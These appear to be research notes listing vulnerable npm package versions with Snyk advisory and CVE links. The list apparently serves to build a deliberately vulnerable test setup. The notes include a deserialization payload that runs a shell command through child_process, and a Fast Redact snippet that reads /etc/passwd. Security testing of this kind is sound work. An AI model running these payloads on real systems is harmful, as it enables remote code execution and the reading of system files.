
To see all versions of a package:

`npm view <package-name>`


### Serialize js 
**Lya does work**
https://snyk.io/vuln/npm:serialize-to-js:20170208
`npm i serialize-to-js@0.8`

```JavaScript
var serialize = require('serialize-to-js');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.deserialize(payload);
```


### Node Serialize
**works**
https://snyk.io/test/npm/node-serialize/0.0.4

`npm install node-serialize`


### Serialize JavaScript

https://snyk.io/vuln/SNYK-JS-SERIALIZEJAVASCRIPT-570062

`npm i serialize-javascript@3.0`


### Safer Eval
**Works**
https://snyk.io/vuln/SNYK-JS-SAFEREVAL-534901  2019-10769
https://snyk.io/vuln/SNYK-JS-SAFEREVAL-173772  2019-10759
https://snyk.io/vuln/SNYK-JS-SAFEREVAL-473029  2019-10760

This needs dynamic analysis first.

### Safe Eval
https://snyk.io/vuln/npm:safe-eval:20170830 2017-16088
https://www.npmjs.com/advisories/1021

### Static Eval
**Works**
`npm i static-eval` (<2.0.0)

https://snyk.io/vuln/npm:static-eval:20171016    2017-16226
https://snyk.io/vuln/SNYK-JS-STATICEVAL-173693   ---

https://maustin.net/articles/2017-10/static_eval


### Fast Redact

https://itnext.io/how-i-exploited-a-remote-code-execution-vulnerability-in-fast-redact-9e69fa35572f

```
const buffer = Buffer.allocUnsafe(8192)
process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600), buffer, 0, 4096)
console.log(buffer.toString())
```

### MathJS

https://snyk.io/vuln/npm:mathjs:20171118-1   2017-1001003
https://snyk.io/vuln/npm:mathjs:20170331     2017-0331s
https://snyk.io/vuln/npm:mathjs:20171118     2017-1001002
https://snyk.io/vuln/npm:mathjs:20170402    2017-0402s
https://snyk.io/vuln/npm:mathjs:20170527     2017-0527



Helper post:
https://capacitorset.github.io/mathjs/

### Morgan 

https://snyk.io/vuln/SNYK-JS-MORGAN-72579 2019-5413

PoC:
https://hackerone.com/reports/390881

### fs-path

https://snyk.io/vuln/npm:fs-path:20180512


### Other Notes

(For Nikos: https://github.com/bkimminich/juice-shop/issues/269)
